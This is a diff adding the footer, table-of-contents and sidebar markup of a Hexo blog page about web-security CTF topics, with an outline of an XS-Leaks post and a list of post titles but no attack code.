+    <!-- idea from: https://hexo.fluid-dev.com/posts/hexo-injector/#%E6%96%87%E7%AB%A0%E6%97%B6%E6%95%88%E6%80%A7%E6%8F%90%E7%A4%BA -->
+    <!-- Mathjax -->
+</main>
+
+                <!-- profile -->
+            </div>
+            <footer class="footer footer-unloaded">
+    <!-- social  -->
+        <div class="social">
+                            <a href="mailto:1844015967@qq.com" class="iconfont-archer email" title="email" ></a>
+                <a href="//github.com/nihao5577" class="iconfont-archer github" target="_blank" title="github"></a>
+                <span class="iconfont-archer wechat" title="wechat">
+                    <img class="profile-qr" src="/assets/example_qr.png" />
+                </span>
+
+        </div>
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- website approve for Chinese user -->
+    <!-- 不蒜子  -->
+        <div class="busuanzi-container">
+                <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+        </div>
+</footer>
+
+        </div>
+        <!-- toc -->
+            <div class="toc-wrapper toc-wrapper-loding" style=    top:50vh;
+>
+                <div class="toc-catalog">
+                    <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+                </div>
+                <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8E%9F%E7%90%86%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">原理：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6%EF%BC%9A"><span class="toc-number">2.</span> <span class="toc-text">利用条件：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF%EF%BC%9A"><span class="toc-number">3.</span> <span class="toc-text">思路：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%EF%BC%9A"><span class="toc-number">4.</span> <span class="toc-text">利用：</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8A%B6%E6%80%81%E7%A0%81"><span class="toc-number">4.1.</span> <span class="toc-text">状态码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XS-Search"><span class="toc-number">4.2.</span> <span class="toc-text">XS-Search</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98"><span class="toc-number">5.</span> <span class="toc-text">例题:</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#NCTF-internal-api"><span class="toc-number">5.1.</span> <span class="toc-text">[NCTF]internal_api</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2021%E7%A5%A5%E4%BA%91%E6%9D%AF-Package-Manager-2021"><span class="toc-number">5.2.</span> <span class="toc-text">[2021祥云杯]Package Manager 2021</span></a></li></ol></li></ol>
+            </div>
+        <!-- sidebar -->
+        <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+        <div class="sidebar-panel-archives">
+    <!-- 在 ejs 中将 archive 按照时间排序 -->
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 15
+        </div>
+        <!-- search  -->
+    </div>
+    <div class="post-archive">
+            <div class="archive-year"> 2025 </div>
+            <ul class="year-list">
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/22</span>
+            <a class="archive-post-title" href="/2025/06/22/flask%20pin%E7%A0%81%E8%AE%A1%E7%AE%97&%E5%88%A9%E7%94%A8/">flask pin码计算</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/22</span>
+            <a class="archive-post-title" href="/2025/06/22/nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93+%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">Nodejs原型链污染&命令执行</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/22</span>
+            <a class="archive-post-title" href="/2025/06/22/PHP%20Filter%E9%93%BE%E2%80%94%E2%80%94%E5%9F%BA%E4%BA%8Eoracle%E7%9A%84%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%94%BB%E5%87%BB/">php filter链</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/22</span>
+            <a class="archive-post-title" href="/2025/06/22/Pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">Pickle反序列化</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/22</span>
+            <a class="archive-post-title" href="/2025/06/22/XS-Leaks/">XSleak</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/22</span>
+            <a class="archive-post-title" href="/2025/06/22/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB&%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">文件包含&文件上传(主php)</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/22</span>
+            <a class="archive-post-title" href="/2025/06/22/sql/">sql小总结</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/22</span>
+            <a class="archive-post-title" href="/2025/06/22/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/">沙箱逃逸</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/22</span>
+            <a class="archive-post-title" href="/2025/06/22/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">php反序列化</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/22</span>
+            <a class="archive-post-title" href="/2025/06/22/xpath%E6%B3%A8%E5%85%A5/">Xpath注入</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/22</span>
+            <a class="archive-post-title" href="/2025/06/22/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">py原型链污染</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/10</span>
+            <a class="archive-post-title" href="/2025/06/10/windows-%E4%B8%8D%E5%8F%AA%E6%98%AF%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/">不只是日志分析-windows篇</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/10</span>
+            <a class="archive-post-title" href="/2025/06/10/%E4%B8%80%E4%BA%9B%E5%B8%B8%E8%A7%81%E9%A2%98%E5%9E%8B%E6%80%9D%E8%B7%AF/">应急响应常见题目</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/10</span>
+            <a class="archive-post-title" href="/2025/06/10/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/">流量分析</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/10</span>
+            <a class="archive-post-title" href="/2025/06/10/redis/">redis攻击手法</a>
+        </li>
+            </ul>
+    </div>
+</div>
+
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+            <span class="sidebar-tag-name" data-tags="web漏洞">
+                <span class="iconfont-archer">&#xe606;</span>
+                web漏洞
+            </span>
+            <span class="sidebar-tag-name" data-tags="php">
+                <span class="iconfont-archer">&#xe606;</span>
+                php
+            </span>
+            <span class="sidebar-tag-name" data-tags="python">
+                <span class="iconfont-archer">&#xe606;</span>
+                python
+            </span>
+            <span class="sidebar-tag-name" data-tags="侧信道">
+                <span class="iconfont-archer">&#xe606;</span>
+                侧信道
+            </span>
+            <span class="sidebar-tag-name" data-tags="nodejs">
+                <span class="iconfont-archer">&#xe606;</span>
+                nodejs
+            </span>
+            <span class="sidebar-tag-name" data-tags="注入">
+                <span class="iconfont-archer">&#xe606;</span>
+                注入
+            </span>
+            <span class="sidebar-tag-name" data-tags="windows">
+                <span class="iconfont-archer">&#xe606;</span>
+                windows
+            </span>
+            <span class="sidebar-tag-name" data-tags="日志分析">
+                <span class="iconfont-archer">&#xe606;</span>
+                日志分析
+            </span>
+            <span class="sidebar-tag-name" data-tags="应急响应">
+                <span class="iconfont-archer">&#xe606;</span>
+                应急响应
+            </span>
+            <span class="sidebar-tag-name" data-tags="redis">
+                <span class="iconfont-archer">&#xe606;</span>
+                redis
+            </span>
+            <span class="sidebar-tag-name" data-tags="总结">
+                <span class="iconfont-archer">&#xe606;</span>
+                总结
+            </span>
+            <span class="sidebar-tag-name" data-tags="流量分析">
+                <span class="iconfont-archer">&#xe606;</span>
+                流量分析
+            </span>
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+        缺失模块，请参考主题文档进行安装配置：https://github.com/fi3ework/hexo-theme-archer#%E5%AE%89%E8%A3%85%E4%B8%BB%E9%A2%98
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+        <span class="sidebar-category-name" data-categories="web漏洞">
+            <span class="iconfont-archer">&#xe60a;</span>
+            web漏洞
+        </span>
+        <span class="sidebar-category-name" data-categories="应急响应">
+            <span class="iconfont-archer">&#xe60a;</span>
+            应急响应
+        </span>
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+
+    </div>
+</div>
+
+        <!-- site-meta -->
+        <script>
+    var siteMetaRoot = "/"
+    if (siteMetaRoot === "undefined") {
+        siteMetaRoot = '/'
+    }
+    var siteMeta = {
+        url: "http://example.com",
+        root: siteMetaRoot,
+        author: "夏饭orz"
+    }
+</script>
+
+        <!-- import experimental options here -->
+        <!-- Custom Font -->
+    <!-- Check browser compatibility of CSS variables -->
+    <script>
+        if (browserSupportCSSVariables === undefined) {
+            var browserSupportCSSVariables = window.CSS && window.CSS.supports && window.CSS.supports('--a', 0);
+        }
+    </script>
+    <script>
+        if (browserSupportCSSVariables) {
+            var customFontName = 'Noto Sans SC:n3,n4,n5,n7'
+            var customFontUrl = 'https://chinese-fonts-cdn.deno.dev/packages/ysbth/dist/%E4%BC%98%E8%AE%BE%E6%A0%87%E9%A2%98%E9%BB%91/result.css'
+            if (!customFontName) {
+                console.log('Custom font name is not set or read failed');
+            }
+            if (!customFontUrl) {
+                console.log('Custom font url is not set or read failed');
+            }
+        } else {
+            console.error('Current browser doesn\'t support custom font.')
+        }
+    </script>
+    <script src="/scripts/customFontLoader.js" defer></script>
+
+        <!-- main func -->
+        <script src="/scripts/main.js"></script>
+        <!-- fancybox -->
+        <script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.36/dist/fancybox/fancybox.umd.js" onload="window.Fancybox.bind('[data-fancybox]')" defer></script>
+        <!-- algolia -->
+        <!-- busuanzi -->
+            <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+        <!-- async load share.js -->
+            <script src="/scripts/share.js" async></script>
+        <!-- mermaid -->
+    </body>
+</html>
